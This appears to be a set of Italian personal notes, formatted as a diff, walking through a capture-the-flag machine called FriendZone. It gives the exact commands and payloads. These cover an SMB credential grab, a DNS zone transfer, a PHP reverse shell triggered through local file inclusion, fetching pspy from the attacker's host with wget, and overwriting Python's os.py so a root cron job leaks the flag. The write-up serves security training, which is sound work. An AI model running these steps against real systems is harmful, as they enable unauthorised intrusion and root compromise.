@@ -1,0 +1,60 @@
+ftp non accedibile.
+Sito nulla di che, non ho trovato nothing di rilevante
+
+Invece su 445 con smbclient trovato file creds.txt
+
+Cerco domain e subdomain visto che ho una mail
+Per i subdomain utilissima anche questa
+dig @10.10.10.123 friendzoneportal.red axfr
+
+Riesco ad accedere ad https://admin.friendzoneportal.red
+
+Tutte pagine non accedibili, faccio la stessa cosa con friendzone.red
+E inserisco ancora tutti i subdomain in /etc/hosts
+
+Noto un'altra pagina administrator che questa volta è accessibile. Entro con le credenziali che avevo trovato nell'smb
+
+Sono dentro e se vado in /dashboard1.php come consigliato vedo una pagina che controlla l'input che ho inviato in uploads.friendzone.red
+
+Accetta anche file non jpg, posso quindi inviare una reverse shell php. Già pronta in SecLists
+
+Devo capire dove è stata uploadata.
+Noto che i file non sono uploadati in /images.
+
+Dopo un po' di test di tipo bruteforce capisco che i file non nella cartella Development.
+Posso quindi uploadare la shell da smbclient con il comando
+put shell.php [all'interno della cartella Development]
+
+Il parametro image_id 1e sicuro ma pagename no, in pagename quindi inserirò
+pagename=/etc/Development/shell
+
+Con ncat la reverse shell viene catturata e sono dentro
+User flag presa
+
+PRIVESC
+sudo -l non funziona
+In /var/www/ trovo un file interessante
+trovo user e password dell'account friend. Posso entrarci
+
+pspy importante tool per privesc in linux, lo importo con il server python solito
+python -m http.server 8080
+
+Prendo con wget
+wget http://10.10.14.9:8080/pspy32
+
+chmod +x pspy32
+
+Poi lo lancio, analizza tutti i processi
+C'è uno script python che sta runnando come administrator
+
+Magari posso sovrascrivere la libreria os. Guardo la directory
+python -c 'import sys; print "\n".join(sys.path)'
+
+apro os.py e scrivo
+echo "infile = open(\"/root/root.txt\", \"r\").read()" > /usr/lib/python2.7/os.py
+echo "outfile = open(\"/tmp/root.txt\", \"w\").write(infile)" >> /usr/lib/python2.7/os.py
+echo "outfile.close()" >> /usr/lib/python2.7/os.py
+
+pspy aveva trovato che reporter.py runna ogni 2 minuti, quindi basta aspettare perchè sposti la flag nella cartella /tmp dove posso accedere
+
+
